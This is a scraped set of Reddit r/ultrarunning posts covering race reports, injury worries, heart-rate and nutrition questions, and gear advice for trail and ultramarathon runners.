2. Another take-home from my reading and research is that zone 2 training allows for a limitless supply of fuel via fat metabolization, and all my training thus far has supported this theory. In fact, I did that 20 mile run on water only and felt surprisingly fine both during and after the run. (I did have Tailwind Rebuild immediately after the run.) Running without taking in calories is a foreign concept to me. For reference, for all my marathon training in the past, I would take in fuel every 45 mins or so on long runs. So when exactly should I start practicing with fuel for a race-day strategy?
3. How will I become a stronger uphill athlete aka trail/ultrarunner if this method of training is keeping me from running any hills at all(due to the fact that my HR jumps past 136 as soon as I start running uphill, so I have been walking all hills)??

I feel like I’m missing something big-picture wise. If you’ve read this far, thank you. And if you have any advice to offer, I would be most appreciative!",ultrarunning,1627862125
Race Report: White River 50M,"This was my third time running 50 miles but my first time doing it in an organized event. Garmin stats: 49.1 miles (79 km), 9786 feet (2983 m) of gain.    
    

The White River 50 at Crystal Mountain in Washington has boasted big names like Anton Krupicka, Michael Wardian, Scott Jurek, and Sage Canaday. Runners toe the unassuming start line in the shadow of the great Mount Tahoma, the tallest volcano in the Cascade mountain range. I left my house on the island just after two, arriving at the race start as darkness still shrouded the forest in mystery. My hands trembled as I taped my toes and slid them into my socks. I breathed deeply and tried to calm myself, but it was in vain. I knocked back a cup of fireball whiskey and jogged to the start line.     
    

And we were off. The four miles to the first aid station were flat and smooth. The aptly named White River rushed beside us. Runners were silent as we began the first 3000 foot climb up to Little Ranger Peak. I sucked down gels and realized I was low on fluids for this nearly-nine-mile section. Fuck. We topped the 5,000 foot peak and ran along the ridge. I settled behind three friends running together. The woman in front of me was stung by a bee and didn’t even break stride. Bad Ass. The trail was lined with wildflowers as tall as me. The contrast of their green vibrancy against towering trees scarred by fire filled me with wonder and awe. A quick stop at the aid station and then I was alone again. I floated down the descent and into the Buck Creek aid station. The volunteers already had my drop bag in hand as I sauntered in. Now it was time to climb again. I partnered up with a guy running his first ultra, shirtless with a pack. I winced at the thought of the “chaffage” in this humidity. It was muggy and the breathtaking views of the mountain were marred by clouds. And so began the second 3000 foot climb. I chatted with the runner behind me, A. His inexperience showed and my concern for him was a distraction from my own struggles. Mostly, we suffered in silence. The camaraderie was comforting. It was hot and none of the aid stations had ice. In that moment, I would have traded my first born for a glass of ice water. Halfway up the climb, the aid station was a welcome sight. They had ice. They took my pack and filled it with ice water. I told the volunteer I loved him and asked him to marry me. He smiled and said “we’re runners too”. I couldn’t wait for A. When I stopped moving, I was filled with dread from the fervent fatigue, the exhaustion consumed me. I had to keep moving or else I would collapse in a chair and surrender. He caught me soon and I offered words of encouragement. “We’re almost there!”. I knew when I reached the summit of Sun Top at mile 37, I could finish. I felt the relief well up as I saw the cars parked before I saw the aid station tent. I took a deep breath and swallowed the tears. “I’m so happy to see you!” I exclaimed to the volunteers. My drop bag had whiskey and I needed it. I dropped my poles, shared shots with A, and sailed down the buttery smooth descent with elation. I had it in the bag, I thought. I powered through my low during the climb, and it was supposed to be easy from here. It was not. The high quickly faded and I had three more shots of fireball and a rice crispy treat at mile 43. A was ready to be done, so he took off ahead of me and I tried to keep up. But a pounding, all-consuming migraine slowed me to not much more than a stumble. The forest was getting dark as the sun began to sink behind the mountains. The river danced beside me, the breeze cooling the tears on my face. I was stewing in my misery, feeling sorry for myself. My chronic headaches feel like a disability and I was both angry and sad. I sobbed. I couldn’t run even though my body was strong. I felt so betrayed by this vessel of my consciousness. 5 people passed me. Maybe more. I fantasized about coming upon a bear and letting it eat me. For a brief moment, I had enough cell signal to call my husband. He reassured me and told me was proud. He is deployed and I missed him terribly. I missed the comforting hand of my sweet 5 year old daughter, the way she strokes my cheek and tells me everything is okay. How can a small child be so graceful?      
    


When I finally reached the bridge that was just around a bend to the finish line, I sighed with relief. I didn’t realize how fucked up my face looked from all the crying until I saw myself in the mirror later. I crossed the finish line and went straight to my car and sobbed. I was proud and happy to be done but I just needed to get out the tears, ride that wave of emotion. I was mad at myself for being weak. For letting the pain get to me. After living with it for my entire existence, you would think I would be used to it by now. I have headaches 24/7 and have for my entire life. Nothing has helped and a dozen specialists and treatments have been unsuccessful. Ultrarunning is helping me restructure the way I feel about pain and has empowered me. But when the barriers broke down at mile 45, I couldn’t fight it. I let the monster consume me. One day I hope to be stronger so I can look him in the eye and say “I don’t care about you anymore”.    
    


I finished in 13 hours and made the long drive back home. No chafing, no injury, just one small blister on my toe. The next morning, I emptied my drop bags and found A's shirt in the one from Sun Top, where we shared shots of whiskey. I have no recollection of putting it there and frankly have no idea how it got there. I do remember him removing it from his pack and complaining about how heavy it was since it was soaked in sweat. I must have offered to stow it for him. Ultra “brain fog” is definitely a thing.

Top of Foot Pain for Last 6 Months,"Not looking for medical advice necessarily just want to know if anyone has had any success beating an issue like this. 

In mid March, I started to develop a top of the foot pain on the right side of my mid left foot, around the first and second metatarsals. It's a pain which is more like tightness, feels like there's almost excess tension that needs to be released. I've felt this before and usually just roll my foot on a tennis ball to massage and stretch it out. This time around it hasn't worked. I adjusted my running schedule until completely stopping on march 30. 

I've seen 2 podiatrists, have had multiple x-rays, and an MRI. Nothing obvious shows up on any of the readings. One podiatrist says it looks like a sprain and could possibly be a stress fracture; he also said my 2nd and 3rd metatarsals are too close together and my 1st is a couple of millimeters shorter than it should be. The other said she didn't see any signs of fractures. We all kind of agreed that it might be extensor tendonitis but nobody has given a straight answer. 

Leading up to the pain, I was doing a lot of treadmill running. Probably 20-25 mpw on the tread and another 10-20 on the roads or trails. 

My feet are pretty flat. My favorite shoes are the Saucony Kinvaras. I don't use inserts; I did cave and pay for orthotics which I haven't received yet. I've been running since I was 18 and now am 26. I'm a slow runner (around 10min pace average), weekly mileage varies (anywhere from 30s to 50s usually, sometimes more if I'm training for a race). I like to run ultramarathons but haven't since covid started (last one was September 2019, 100miler). 

In hopes of fixing this issue I used crutches for 3 weeks, which did relieve some of the pain. But it's still there and just continues to get worse as I use it (started walking dogs about a mile a day a week ago, have since stopped). I'm thinking about crutching around again but it's been almost 6 months of no running and minimal walking. Really not sure what else to do to make it better. Any recommendations? Would a stress fracture or extensor tendonitis last this long? 

I'm starting grad school in the fall and will not have enough time (or good enough insurance) to see more doctors.",ultrarunning,1627849232

Calf sleeves/compression socks,"Howdy gang,

Long time injinji fan boy, however recently training for a race with a lot of sand/beach running and have found my calves seem to like to have some compression around them (and the longer coverage helps keep sand outta the shoe/gaitors) 

At previous races I've seen lots of people with compression gear.

The injinji compression socks don't seem super bullet proof and after a few long runs I'm start to believe they were designed for recovery purposes.

"Does anyone have experience with ""Anti-Runners"" who started training, but couldn't hack it, gave up, and are now actively engaged in stopping other people from training?"," Probably a weird question, so I hope it's ok to post here.

I was told the following analogy about runners (specifically for the Boston Marathon, but I think it could apply to any race). I am skeptical of the story but I'd like to do my due diligence. I'm using my best Google-fu but still coming up short. I'm looking for stories similar to the analogy described below and any sources or communities you can point me to that might know more.

Here's the analogy:

&gt;You have trained for years to even qualify to run... you have come to Boston... you have started running the race..... and then you realize how hard running a marathon really is. So, at mile 16, you quit. You realize that quitting is so much easier than running and you start to rationalize that quitting was the smart thing to do. But there is a problem, your brother also prepared, came to Boston, and ran the race, and he did not quit. At first, you are ok with him running and finishing the race but quickly the guilt of being a quitter starts to eat away at you. You start to badmouth running and your brother in hopes of alleviating the guilt and now anger you feel towards running.  
Quickly you realize that your old group of friends, who are runners, are not going to buy into your badmouthing of running; so, you gravitate towards other ex-runners who also hate it. Soon you are in an echo chamber... you are all reassuring each other that you are right, you keep saying that running is evil, you all talk about how much easier it is to not go running, and only fools would run a marathon. But every time you see a runner it pricks your conscience and triggers guilt from \[not exercising\], shame from your lifestyle, and anger that they dare find joy in running.  
Soon it becomes your quest not just to not run, but to get other runners to quit running too. You start to blog, tweet, and Facebook about how awful running is, it becomes all-consuming. ...You feed off the running hate-fest of others. For each runner that you can convince to quit will provide you the momentary satisfaction that you are at least not alone in your misery. The longer this cycle continues the less you remember the joy of running with your brother and friends, till the only memories are jaded memories of everyone being rude, and how awful running felt.

I'm trying to find these poor former-runners who are consumed by hatred stemming from their own inadequacy to get their side of the story but despite how vocal they are described to be in this analogy, I'm having some trouble.

I assume as runners yourselves, you are constantly assaulted by these kinds of people who have quit and seem to relentlessly attack your choice to run. Please share your stories.",ultrarunning,1627754839

Just moved to southern Oregon Coast. Excited to check out our upcoming race calendar! Less excited to see a weird clump of the few ultra events in \~driving distance coming up all in early October...

* Oct 2nd 50K or 25K
* Oct 3rd 50K (already signed up for this one)
* Oct 9th/10th 25K/50K (same course/organizer)

I almost stupidly/boldly signed up for the 50/50 double on Oct 2nd/3rd. The following weekend popped up in my email just in time to give me second thoughts!

For some context I've done two 50K's this year, plus three other marathon+ length trail runs (two FKTs and a last-one-standing). I was at \~70 mpw for most of the year prior to a relative down July due to moving events, but back up to 50mpw for this week. I'm sure that I could reasonably do a 100K race in October with some more focused training (long runs)... two 50Ks over two days, easier, right?

I should probably be reasonable and skip the Oct 2 event entirely. But if I was to do 50's on the 3rd and 9th... anyone have pertinent experience or advice? Anyone want to smack some sanity back into me? Bring me a beer at the finish line (or halfway point)?

"At the end of my tether with my knee injuries. I'm searching for positive recovery stories because I cannot take it anymore. The uncertainty, the time off. None of the PT's are insightful.

I'm simply searching for mental relief from my despair. I've never been so wrecked as I am right now, and not just because I cannot run but the running really saved me from my current situation. 

I've seen multiple PT's and nobody has an answer for me.

I started running about a year ago and worked my way up to about 30 miles a week. I did my first 30 miler after about 6 months of training and I did a 50 miler in January. This was all very quick, and with improper form and excessive training on rugged terrain and trails combined with increasing my mileage from 30 to 50mpw in addition to steep hill training, I got injured.

The injury is just a niggle. In both knees. In the medial area in the groove between femur and tibia. It might be my meniscus. It might be the plica. It might be the MCL. It might be the pes anserine bursa. It might be a different bursa. It might be the boogeyman. No idea. Nobody has an idea. The MRI has no idea. The X-ray doesn't either. The PT's have ideas and have no shame in hiding the fact they don't know which one it is. But they'll carpet bomb me with a range of exercises, which I have done with rigorous and meticulous focus. 

The injury started 3 months ago. I've been strengthening my glutes, my quads, and my hamstrings. Especially the quads and medial glutes. I've been foam rolling and stretching in addition to focusing on my hip flexors.

My legs are stronger. My anterior pelvic tilt is much less. My knees....are STILL complaining. If I run 6 miles a week, they complain for days. They don't like squats, or deadlifts either.

I really am not the wisest person in action, I think this is because of my mental health issues, poor self-esteem, and neurotic disposition to kicking the shit out of myself and forcing myself to work to a standard. It's very unhealthy and I've learned my lesson.

IF THIS THING PASSES,  I'm just going to build up 1 mile per week, and in 50 weeks ill finally, be at 50 miles per week. But I fear that it may never pass. What if this is permanent? Are my knees permanently damaged? There's nothing on the scans so it's not as serious as a tear....nobody seems to have an answer and I cannot describe the rage and frustration I feel about that. 

I want to be an ultra runner. I would like to achieve the 100 miler, the 200 miler and run in beautiful places around the world. I'm even learning Spanish so I can permanently live there because I think the running locations are just amazing. I love running, but I'm afraid that I've ruined myself.

With my depression, poor position in life, and just generally terrible mental health I'm in a pit of despair. It's becoming perfectly clear that my running dreams are shattered, but I hope this is just the illusion posed by my disastrous mindset.

Please. Someone. Someone experienced knee injuries or something. Someone who fell into the same traps as I have and fucked up the same way I have. What did you do? Did your knees get better? Did you come back stronger and achieve the things you wanted?

Are 3 months a reasonable time for irritation of the plica, or irritation of the meniscus, or irritation of the pes anserine bursa, or some variant of PFPS, or some issues caused by poor knee tracking to recovery usually? Or is it perfectly normal for this span of time to elapse and still be struggling?

Just please someone tell me a positive fuckin story I can relate to...

Thanks if you got this far, sorry for causing your eyes to go into the back of your head too.",ultrarunning,1627496452
Salomon vs Camelbak hydration vests for 6+ hour trail runs?,"I'm looking to buy a hydration vest that can be used with a bladder, for 30+ mile (ideally up to 50/100 mil distances but I've got a 30 mile mountain race in 2 months so primarily for that!) trail runs, usually quite hilly so it's at least 6 hours at a time (my 30 miler will have aid stops every 10 miles but i'd rather be overprepared than under).

I'm guessing the most popular advice would be Salomon Adv Skin 5 or 12, but at the moment I use Camelbak Octane Dart for my training runs up to 20 miles and I'm loving the bladder set up, although obviously not enough storage space for other things - Camelbak Circuit 1.5 L seems to be like an obvious upgrade.

Is there a reason why Camelbak hydration vests aren't that popular, am I missing something? How good are Salomon bladders when used with Adv Skin 5? Do they leak at all?

Bonus question for women: has anyone bought either Camelbak Circuit 1.5 Women's, or Salomon Adv Skin 8 (the one designed specifically for women's build) vests? Would they be worth investing? I'm usually a bit wary of any unisex gear or clothes because of different fits!",ultrarunning,1627492284

Help with running vest sizing,"Hi,

I'm looking into getting my first vest for trail running and think I've settled for the Salomon Adv Skin 5. But I'm not exactly sure how it's supposed to fit. I'm quite a tall lanky guy at 2,05m/6ft 8"" and 90kg/198lbs. My chest measures 101 cm/39.7""  I've got both the M and L to try at home and kinda feel that I'm inbetween sizes. I usually don't do any longer runs in winter so the most layers that I'll have underneath is probably a t-shirt + windjacket. 

Loaded with some clothes in the back and socks in the front the vests fit like [this.](https://imgur.com/a/YfkyniN) Unfortunately I can't fill the bottles if I want to return them. Both fits quite snug but the large it's a tad roomier which makes me worry that it'll bounce around to much. The medium probably won't bounce, but it might be a little tight around the armpits. Will the vest permanently stretch out after a lot of use or will the fit basically stay the same? 

I'd be grateful for any insight on which to choose! 

Thanks in advance!",ultrarunning,1627331391
Has anyone experienced this before? knee pain,"Exactly 2 weeks ago I was playing basketball and played for about 3.5 hours straight. I did not twist my knee or anything when playing and I could have even played longer. Felt fine after basketball until 2.5-3 hours after the session. I felt my knee stiffen up at the back of the knee and in front of the knee. 1-2 hours later when I go to bed the stiffness starts to turn into immense pain, like 10/10 pain and for 3 hours during the night I was literally not able to move my leg because of how much pain I was in. I took an anti inflammatory went to sleep and woke up 3-4 hours later. That immense pain was gone but my entire knee was tender and lost full extension and flexion of the knee joint. when I woke up in the morning, I was able to walk on it fine and put my entire weight on it fine but with that tenderness  and loss of full extension/flexion. The following day, I regained full flexion and extension and the knee was still tender. 6 days after I go to the gym to test it out, and I am able to do single leg squats, lunges with weights lateral jumps and so forth with no problem. The only difference I noticed is that the knee felt weaker than my right knee. 2 weeks after the ""incident"" today, my knee is almost 100% back to normal with just a bit of tednerness to the touch and still does not feel 100% strong like my other knee. I went to the doctor to get the ligaments checked and what not and its all good. I know the tests myself and tried it on my own and everything is good and sturdy.

"Question: heart rate won't stay below zone 3 at high mileage, but perceived effort is zone 2-ish","Greetings!  I am hoping y'all can offer some insight.  I am training for my first official 50k, and I've done a few marathons/shorter distance in the past.  This is my first time doing structured training and I am doing the 80/20 system, focusing on keeping 80% of my runs in zone 2 based on heart rate.  My race-day goal is to finish in under 6 hours.

Since I began preparing for this race, I've been focusing on total weekly mileage and before this weekend had not run further than about 13 miles in a single training run.

I just ran my first longer run (21 miles) since I began this training regimen.  Up to about mile 12, I kept my heart rate easily in zone 2.  It crept up to zone 3 periodically and I slowed down to bring it down.  

I did a pit stop at mile 11 to use the bathroom and ate half a PB&amp;J.

After about mile 12, my heart rate went up into zone 3 or higher and stayed there.  My perceived effort still felt zone 2-ish though.  By mile 15, I was feeling not as fresh as when I first started but energy levels were good.  But by mile 15 I could not bring my heart rate below zone 3, even when I walked at a completely casual pace.  When I jogged it went up to zone 4.  It remained that way the last 5 miles of the run.  

From an energy level/perceived effort perspective, my run was consistent with my goals.  But the higher heart rate concerned me based on the 80-20 training principals and my goal of maintaining that energy level for another 10 miles.  

I would appreciate any insight from those who have experience with this.  Is that normal?  At that point, should I focus on perceived effort instead of heart rate number?

I don't think my diet affected my heart rate, but I will mention that some of my nutrition I had on the run had caffeine in it.  It was total 100mg of caffeine, which was divided into 6 portions.  I took one portion (1/6th of 100mg) every 40 minutes over the 4 hour run.  I normally drink 200mg of caffeine per day (coffee) and I only had one cup of coffee so far that day, so I don't think the caffeine would have affected my heart rate.

How to add a short race training cycle between long races training cycles?,"Since a few years my training is focused around long trail races (from 50km to &gt;100km)

I have just completed a 6 months training cycle concluded by a 100km 6000m elevation race. 

My training is focused on mileage (roughly &gt;95km per week the last 3 months before a race) at low-ish intensity and elevation (as part of my runs + hill repeats). So no speed work or tempo runs.

&amp;#x200B;

I am considering joining a short trail race (1/2 marathon, 200m elevation) during the autumn.

So it will be a training cycle of 3 months for a shorter distance between training cycles for longer distances. 

I'm a bit uncertain how to attack this and have been struggling to find some info regarding this specific case:

\- Is it best to follow a training plan for a 1/2 marathon?

\- Or should I maintain my current approach (low intensity mileage), maybe reduce the distance per week and add one or 2 specific sessions per week, and in this case what kind of work is the most efficient for a 1/2 marathon (tempo run, fast intervals, long intervals...)?

New shoes causing foot pain?,"This is a bit of a noob question, but I'd love to get some advice.

I'm new to trail running and longer distances. Previously, I had one pair of road running shoes that I loved and wore out after about 800 miles running casually and a several half marathons + training. Then I stopped doing much running for about 5 years once we had kids. I am getting back into running and have been running trails doing runs between 5-25k hoping to get to 50k someday. I've been wearing a pair of a road shoes I bought last year to replace the olds and it's been fine but the trails here have been very muddy and wet and I wanted to 'graduate' to some trail running shoes (only discovered the distinction from watching Ginger Runner). I've been holding off because I don't have a lot of money to spend on fancy shoes, but saw a significant sale at the weekend in a local store and picked up a pair of Asics Sonoma 5 GT-X and Fuji Trabuco 8 both the same size. I thought I got a pretty good fit (tried them in person). My feet were feeling pretty sore after the weekend as I ran 25k on Saturday and the on Sunday I ended up having to walk for a very long time in terrible flat deck shoes. My feet were feeling pretty tired and sore on Monday. Tuesday I took the Sonomas out for short 5k spin. Whilst the extra grip felt amazing compared to running in road shoes (especially going downhill on trails) my right foot (on the top) got really painful and then felt horrible for the rest of the evening. My left foot starting to feel a little weirdly numb (kinda like start of pins and needles) whilst running. Now on Wednesday my right foot feels okay but kinda strained in the tendons on top in a way I've never felt before. I'm wondering if this could be the new shoes (combined with some stress from the weekend walking) and whether this might just be that they need time to 'warm up' / 'stretch out' / whatever to my feet? Is that a thing?

I don't really remember feeling this kind of thing before, but (to my embarrassment) I have only ever bought two pairs of running shoes (seen above). Could it be a sizing issue? If anything they feel a little bit looser than my current shoes, mostly at the heel. There is plenty of space up front (about a thumbs width between my big toe and end). Should I just give them time to wear in or should I try to exchange them (I'm guessing this is not possible since I already wore them... damn)? I'm pretty terrified of getting injured (I had a meniscus issue a few months back that knocked me back and it sucked) but the money thing is an issue.

Any advice appreciated, I'm kinda new to this. I guess till my foot feels better I will rest and just run in the shoes I was running in before which didn't cause any foot noticeable pain (not at 5k distance anyway!) I haven't taken the Fuji Trabuco's out for a spin, but I am hoping they will be different. But maybe I should cut my losses and return those as I haven't worn them out yet (I don't know how different they could be to the Sonomas, they look quite different structurally compared to the Sonomas and they feel a bit more of a snug fit when just wearing them around the house).",ultrarunning,1626902130
Creating apple watch app for runners,"Hello guys,

I am a software engineer who started to run recently. While I was doing my research about running I found out that I should track heart zones during workouts.

I searched for heart zones watchOS tracking apps, tried some, but none of them seemed to suit me well. My requirements were mainly:

* Track heart zone with other workout metrics (distance, bpm, pace, time) in same screen without scrolling, just with glance at my watch.
* Device beeps (vibrations) when passing through zones.
* Support of continuous alert when leaving target zone. Stop beeping when entered target zone again.

As a bonus, few times I wanted to know when sunset occurs as I didn't know if I could take extended route and make it home until sunset. Like some sort of sun pictogram with minutes left, showing 45 mins before sunset.

So I decided to create a watchOS app for myself that will satisfy my needs, which I mentioned earlier. Currently I have working prototype, that I am beta testing by myself. I am planning to add new features, companion iOS app with settings etc.

What is your opinion about the app? Would you use it? What workout app for watchOS do you use now? What features do you miss on those apps?

I had a 30 miler on the schedule for my training run this weekend.  I live in the Southeastern US where we have the joy of both heat and humidity.  I started at 5:10am in the dark at 72F and 97% humidity.

I kept a slow and steady pace knowing that it was going to warm up quite a bit during the 30 miles.  All went well until about mile 23 when I started cramping in my legs.

I ran a 9.5 mile loop, at the end of each loop, stopped and either changed out bottles or refilled bottles at my car, and continued.  Each loop I carried three 500ml soft flasks and wiped them out each loop.

 

The fluids I took were:

Loop 1: 1L of electrolytes, 500ml of complex carbs (250 cals)  
Loop 2: 1L of complex carbs  (500 cals), 500ml of electrolytes  
Loop3  : 500ml of electrolytes and complex carbs (250 cals), 500ml of complex  carb (250 cals), and 500ml of electrolytes, and I took in 1 gel that was  190 cals with electrolytes around mile 24.x

Every hour I took 2 salt stick chews as well.

In total, including the water I drank at my vehicle, I took in 5L of fluids maybe a tick more.  Yet still cramped, and even more important than that - I lost 11 pounds of water weight during the run.  ELEVEN POUNDS.  


So my question is, for others that are in the hot/humid environments, what is your typical intake goal per hour for fluids.  My goal was 1L per hour, which I fell a little short of, next time I will have 2L of fluids on me for a 9-10 mile loop.  In addition to that, what is your caloric intake goal during an hour (yes, I know everyone is different).  


I have a 50 mile training run on 8/21, and it will still be hot/humid/muggy then, and I am trying to plan better, and stay hydrated better, because I felt miserable for the remainder of the day on Saturday.  


Any experiences in hot/muggy environments are appreciated!",ultrarunning,1626812882
Badwater 135 underway," The Badwater 135 Ultramarathon in underway (Mon-Wed) across Death Valley to fire-ravaged Mount Whitney Portal, climbing 14,600 feet along the way. The temperature will reach 117 degrees F with pavement temperature around 160 degrees. 

In 1966, Jean Pierre Marquant, an ex-paratrooper from France became the first known person to deliberately attempt to cross Death Valley on foot during the heat of the summer. He accomplished a solo circular route of more than 100 miles that also involved scaling several high peaks.

In 1969, James Burnworth and Stanley Roderfer from San Diego, CA, started the idea of going from the low point (-282 feet) at Badwater, to the top of Mount Whitney (14,505 feet) when they successfully hiked it in two weeks during November. A two-man relay craze started in 1973 as duos sought for the fastest known time. Al Arnold of Walnut Creek, California is credited for accomplishing the first Badwater solo in 1977 to the top of Mt. Whitney in 84 hours.

Elevation gain and training critique,"I run as a way to enjoy the mountains, maintain my mental health and gain fitness for my ambitions in rock climbing and alpinism. I currently run/hike about 30-50 miles a week. I run Monday-Friday 5.3 miles, 250 ft elevation between 50-60 mins during my lunch break. On Wednesday and saturdays I will do longer run/hike/scrambles. Last week I did about 7k in elevation. I also train climbing x4 a week in the evening and weight train x2 a week. 

Im reaching out because I want to improve my uphill speed and stamina. That’s really all I’m after. I know I should probably be doing more speed work, but I prioritize other workouts.

Currently I have a goal to do a summer run/hike that would include 20k+ in elevation and probably between 20-30 miles - I’d like to do it in 36 hours 

How much vertical gain should I be going for per week? Is my rolling hill lunch run helping fitness? I’m familiar with Training for New Alpinism but not so much with Training for the Uphill athlete.

Injury advice,"Hey UMers - 43 yo man here - been training diligently for a 50K (my first) in October without issue until this past Saturday, running 45-65 miles weekly. 

I was running an easy long run (15 miler) and around mile 8 my left leg blew up. Specifically, dull pain started behind the left knee, then radiated up to the left butt cheek and all the way down to my left pinkie toe. I went from an 8min/mile pace to an 11+min pace. I finished the ‘run’ (more of a shuffle).

Clearly, I didn’t tear anything, as the pain would have been too much to keep running. Some friends think it’s sciatic nerve inflammation. I’ve been icing it, applying heaps of bengay, and using a Theragun Saturday and Sunday.

My question is: what kind of recovery timeline am I looking at? What should I do or NOT do so I can get back out there quickly? I’m also open to other people’s ideas of what the cause of the pain could be… (one thought is that I was running in new shoes that only had about 20 miles on them)

Is running X miles over 24 hours easier on your legs than running the same distance contiguously?,"I ran my first trail marathon recently, 4.5 hours on fairly flat terrain. It was my first time running more than 18 miles in one hit. I was pretty sore by the end and hobbling a bit the next day but felt fully recovered within a week.

I'm considering attempting 100km spread over 24 hours next but not really sure what to expect in terms of the toll on my legs and feet. Does taking rest periods between segments reduce the damage?

Advice for a double marathon,"Hi, some friends and I did our first ultra runs last year and are looking to do a double marathon somewhere this fall.

Last November we ran 60k last November at a 5:46 /km pace. We sort of winged it with the training schedule. We were comfortable with weekly half marathons and started ramping up the distance with 5km every two weeks until we ran a marathon and 45km a week from each other. We continued with half marathons for two weeks and then we did the 60km.

However, 85km (let's round it up) is another 25km. Should we train like we did until 60km or leave it at 45 again? We're already running half marathons weekly for months again.

Does anyone have some tips as we're still new to ultrarunning? I could link my Strava if anyone would like to see our progress.",ultrarunning,1626697083

I absolutely love the Hoka One One challengers and have worn them for years now. The fit just works extremely well for me. I have some achilles issues and the cushioning helps with those a ton. On the other hand, if I try something beefier, I often start to get other problems. I'm not a huge fan of the speedboat because I always end up with IT band problems or something. 

As much as I like the challengers though, they aren't an amazingly secure shoe on tough terrain. There is outsole rubber on only parts of the bottom and the lugs aren't very big. I want something that I can comfortably scramble around on mountains in, but with a similar fit and cushioning as the challengers.

Need some help with run nutrition for a 50km,"Hi all,

Some info about me and my route before I continue:

18 years old, been running for about 2 years now, I run about 30-40kms a week right now, but planning on increasing to about 50km a week over the course of the next few weeks

Planning on running a 50km in late september (probably closer to 48kms), by myself. No official race or anything just wanted to do it off my own back. The run itself is very flat, practically a road run for the most part, only about 300m of elevation over the course of the whole run. This will also be my first 'ultra'

I dont have a time goal or anything, the only metric im going to try and stick to is running around 7:00 minutes per km for most of the run. And if I have to walk some, so be it. I just want to finish it.

&amp;#x200B;

The main point of this post was to find some more information on race nutrition as the majority of things online are based on race environment high elevation change trail runs. Ive done a bunch of research on race nutrition but to not much success except for finidng some popular real foods to run with. I have previously ran a half marathon on only 2 gels, feeling pretty good at the end of it. 

Just wondering if someone more experienced than me can assist me in helping find out what to take on my run based off the info I have given. Could I do the run purely on gels and blocks or will I need real food?

Sorry about the wall of text, just couldnt really find much info about nutrition for my situation.

Any other tips for 50km runs would be greatly apprecited as this is my first one.

Running my first ultra race next summer,"Hello everyone.

I have been running for about 3 years now. Nothing serious - 5ks, 10k, and half marathons. As a point of reference, my half-marathon PB is 1:54 - nothing spectacular. I'm 5'10"" and 188lbs (on the heavier side). I run about 25mpw, half of that is on the treadmill.

A buddy of mine roped me into running a trail 50-mile race July 2022. I was also thinking of running my first marathon Fall 2022, so I know I need to get to work. This gives me about a year to train for the 50-mile race.

Right now my goal is to lose get to 180lbs by the end of August, and PB the 5k, 10k, and half-marathon - I'm running one of each of those in September/October, all two weeks apart. My training plan peaks at 40mpw.

**Question**: And then what? I'd love to **crush** the 50-mile trail race next summer. But I live in MN where running outside sucks Nov-March. I will still run outside 1-2 times a week to keep my ""outdoor running muscles"" in shape. Unfortunately, the miles are so much easier to do on the treadmill. My idea is:

- Maintain 30-35mpw with at least 10 miles outdoors, even during the MN winter. 
- Spend a lot of time doing squats, deadlifts, core, and other supplementary strength training
- One day a week on an exercise bike to work non-running leg muscles
- Try to get my weight down to 165lbs by next March
- Do a 50-mile training plan from March 2022 - July 2022

I’m considering bumping up to 50 miles or 100K next summer but that is a long way away.  Even if I stay at 50k I probably won’t be able to run one until next summer.  One option I’m looking at isn’t until next September.  So my question is - what do I do now?  When I resume running after a week of rest how low should my mileage be relative to my peak volume before the race?

Slow Runner Training for First Ultra,"First of all, I know speed is relative but I’m pretty slow by any standards. I’ve been running since 2014, and pretty much exclusively running trails since early 2020. On trails, I’m lucky if my pace is below 14 min/mile, and it’s even slower than that on rocky trails or those with lots of vert. Also, not that it matters, but I’m not overweight (closer to underweight actually), and am slower than many women who are heavier than me, so I guess I’m just naturally slow 🤷🏻‍♀️

I want to start training to run my first ultra before my 30th birthday next July, and I’m wondering if anyone has advice for a slow runner on how to get the longer training runs in. The furthest I’ve ran so far is 15 miles. My last truly long run (13.1 miles) was back in April, before I injured my ankle. I’ve been in PT ever since and have done a couple of 8 milers and a few 7 milers since then, but I want to start building back up to double digit long runs so I can feel more ready to really start ultra training this fall. 

The problem is it’s taking me 2+ hours to run 8 miles (with 1000+ feet of elevation gain). A lot of this is due to the heat (I live in Arizona which is basically a furnace in the summer). I’m spending roughly 12 hours running each week, and that’s only getting me 40-45 MPW. 

Is this enough of a base to start ultra training? Are there any slower runners out there with advice on how to successfully train for an ultra? I honestly don’t have any time goals — I just want to finish (and hopefully not DFL 😂)",ultrarunning,1626206616

I just moved to a new part of the country and am looking at doing a small part of my running on pretty remote country gravel roads in areas with no cell phone service. Does anyone here have experience with carrying a GPS device for such settings? I know some bike riders who use Spot, have read a little bit about what Garmin makes...

I'd be running with a Salomon hydration vest, so something to drop into either the front or back of that. Lighter is better, as always, but I'm not the type to obsess over the difference of an ounce or two or three.

Realistically, I'm sure my running will be something like 80-85% pavement, 10% more popular trails, and maybe 1, 2, or 3 runs a month on these rough and remote routes.

Is joint pain part of the ultrarunning experience ?,"Hi,

I feel like with some correct training (I plan on adding strenght training to my routine), one can push away the moment when the joint pain will happen, but it will happen anyway at some point.

Precision Hydration Sweat Tests - Help Required,"This may be UK specific as I'm not sure if Precision Hydration operates overseas but I'm looking for reviews from people who have used their sweat test.


I've been having a lot of problems with cramps on any run over 22 miles, mostly in the calfs but sometimes in my thighs and even in my back on occasion. 


I'm a heavy sweater and sweat a lot of salt. I get crusty arms and you can see it outlined in my caps, running vest and clothes. 


I ran an ultra this past weekend and managed to keep the cramps at bay but I drank a ridiculous amount of electrolyte drinks, refilling a 500ml soft flask at almost every aid station with either a high5 tab or a Hammer Nutrition Endurolyte tab. Ended up using 7 electrolyte tablets though the 100km.


The problem is (I think) this caused me to have GI issues from about the 80km mark meaning I really struggled to get in any fuel for the remaining 20km and caused me to vomit once (with two tactical chunders).


I was wondering if anyone out there had used their sweat tests to dial in their salt/electrolyte needs and if there were any real world reviews. I've tried Web searching but only get results for their products and not the tests themselves. Its around £125 to get the test done and I really want to avoid dropping that money on it if I'm not going to get useable results.


I've got a 100 miler coming up in a couple of months and I don't want to have to rely on the scattergun approach of just forcing in tonnes of salt tabs in the hopes that I'll get the balance right between no cramps/ no GI issues.

Navigation with Garmin Fenix - too many waypoints on track,"So I've signed up and trained for the Pitztal Alpine Glacier Trail Ultra (105km, 6.000m/18.000ft of gain).

It shows the route and you can navigate, but I'm unable to add POI (eg food/water stations) so that the watch shows me how far I've left to the next POI.

Medical tests to request for cardiovascular issue beyond the basics,"Kind of a specific question but I figured maybe others here have dealt with similar things and can provide insight.

